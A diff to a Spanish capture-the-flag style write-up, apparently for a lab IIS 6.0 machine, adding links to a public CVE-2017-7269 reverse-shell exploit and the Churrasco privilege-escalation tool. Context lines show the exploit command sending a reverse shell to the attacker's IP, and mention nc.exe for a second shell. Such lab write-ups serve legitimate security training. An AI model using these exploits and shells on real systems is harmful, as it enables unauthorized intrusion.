@@ -114,7 +114,7 @@ Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                        
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 ```
 
-Un Remote Buffer Overflow, yo creo que a nadie le gusta programar su propio BOF asi que vamos a probar ese mismo. Pero hay un problema, ese script lo que hace es lanzar una calc.exe y yo creo que nadie que este leyendo esto quiere probocar que se abra una calc.exe en la maquina, buscando por google encuentro otro script en python que nos ejecuta una rev.shell hacia nuestro sistema, eso ya si mola mas eh. 
+Un Remote Buffer Overflow, yo creo que a nadie le gusta programar su propio BOF asi que vamos a probar ese mismo. Pero hay un problema, ese script lo que hace es lanzar una calc.exe y yo creo que nadie que este leyendo esto quiere probocar que se abra una calc.exe en la maquina, buscando por google encuentro otro script en python que nos ejecuta una rev.shell hacia nuestro sistema, eso ya si mola mas eh. [Link](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell)
 
 ```bash
 ❯ python iis6\ reverse\ shell 10.10.10.14 80 10.10.16.198 443
@@ -173,7 +173,7 @@ System Model:              VMware Virtual Platform
 System Type:               X86-based PC
 ```
 
-Esta usando un sistema operativo de 32bits y ademas es un Windows(R) Server 2003, por lo que es bastante antiguo, y en este tipo de sistemas es mejor tirar de churrasco.exe 
+Esta usando un sistema operativo de 32bits y ademas es un Windows(R) Server 2003, por lo que es bastante antiguo, y en este tipo de sistemas es mejor tirar de churrasco.exe [Link](https://github.com/Re4son/Churrasco)
 
 Nos compartimos el directorio de trabajo con la herramienta de impacket y nos copiamos el archivo y el nc.exe para otorgarnos una reverse shell:
 
